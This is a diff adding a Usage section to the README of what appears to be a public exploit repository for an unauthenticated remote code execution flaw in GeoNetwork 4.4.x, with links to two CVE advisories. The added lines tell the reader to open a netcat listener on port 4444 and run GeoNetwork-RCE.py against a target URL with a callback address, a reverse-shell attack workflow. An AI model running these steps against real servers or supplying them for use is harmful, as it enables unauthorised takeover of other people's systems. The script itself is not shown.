@@ -6,3 +6,17 @@ Unauthenticated RCE - GeoNetwork All 4.4.x releases up to and including 4.4.11 a
 - **CVE-2026-63219** -> [https://github.com/geonetwork/core-geonetwork/security/advisories/GHSA-mh22-prqr-vf42](https://github.com/geonetwork/core-geonetwork/security/advisories/GHSA-mh22-prqr-vf42)
 
 - **CVE-2026-58400** -> [https://github.com/geonetwork/core-geonetwork/security/advisories/GHSA-x898-729x-cc3r](https://github.com/geonetwork/core-geonetwork/security/advisories/GHSA-x898-729x-cc3r)
+
+## Usage
+
+Start a listener on the port you plan to use:
+
+```bash
+nc -lvnp 4444
+```
+
+Then run the script, replacing the URL and callback IP with values reachable from the target:
+
+```sh
+python3 GeoNetwork-RCE.py --url http://target/geonetwork --lhost 10.10.x.x --port 4444
+```
